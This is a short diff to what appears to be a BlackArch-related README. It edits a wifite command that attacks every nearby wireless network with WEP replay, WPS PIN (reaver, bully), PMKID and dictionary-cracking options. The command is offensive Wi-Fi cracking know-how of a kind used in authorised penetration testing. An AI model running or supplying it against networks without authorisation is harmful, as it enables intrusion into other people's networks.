@@ -126,7 +126,7 @@ For [`BlackArch`](https://github.com/4k4xs4pH1r3/blackarch)
 ----------
 
 ```bash
-wifite -inf --daemon --showb -mac --keep-ivs -ic -first 37 --require-fakeauth -pow 37 -p 137 --chopchop --arpreplay --caffelatte --hirte -p0841 --all --ignore-locks --reaver --bully --dict /usr/share/wordlists/fern-wifi/common.txt
+wifite -inf --daemon --showb -mac --keep-ivs -ic -first 137 --require-fakeauth -pow 13 -p 137 --chopchop --arpreplay --caffelatte --hirte -p0841 --all --ignore-locks --reaver --bully --pmkid-timeout 120 --dict /usr/share/wordlists/fern-wifi/common.txt
 ```
 
 
